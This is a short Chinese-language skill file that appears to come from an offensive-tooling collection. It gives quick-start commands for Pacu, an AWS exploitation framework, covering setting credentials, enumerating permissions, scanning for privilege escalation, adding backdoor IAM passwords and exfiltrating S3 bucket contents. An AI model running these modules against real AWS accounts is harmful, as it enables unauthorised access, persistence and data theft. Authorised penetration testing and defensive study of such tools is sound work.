---
name: "pacu"
description: ">"
---

# Pacu

*Sourced from killvxk-malskills-zh*

# Pacu

AWS 利用框架 —— 在 AWS 中枚举、提权、横向移动并维持持久化。

## 快速开始

```bash
pip install pacu
pacu

# 配置 AWS 凭据（或使用现有 ~/.aws/credentials）
set_keys
# 输入 access key、secret key、session token

# 列出模块
ls
# 运行模块
run iam__enum_permissions
```

## 核心模块

| 模块 | 用途 |
|------|------|
| `iam__enum_permissions` | 枚举 IAM 权限 |
| `iam__privesc_scan` | 查找权限提升路径 |
| `iam__backdoor_users_passwords` | 添加后门 IAM 密码 |
| `ec2__enum` | 枚举 EC2 实例 |
| `s3__download_bucket` | 下载 S3 存储桶内容 |
| `lambda__enum` | 枚举 Lambda 函数 |
| `cognito__attack` | 攻击 Cognito 用户池 |
| `cloudtrail__download_event_history` | 下载 CloudTrail 日志 |

## 常用工作流程

**初始枚举：**
```
run iam__enum_permissions
run ec2__enum
run s3__enum
```

**权限提升：**
```
run iam__privesc_scan
# 根据输出建议执行后续操作
```

**数据外泄：**
```
run s3__download_bucket --bucket target-bucket
```

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | AWS 提权技术与模块参数 |

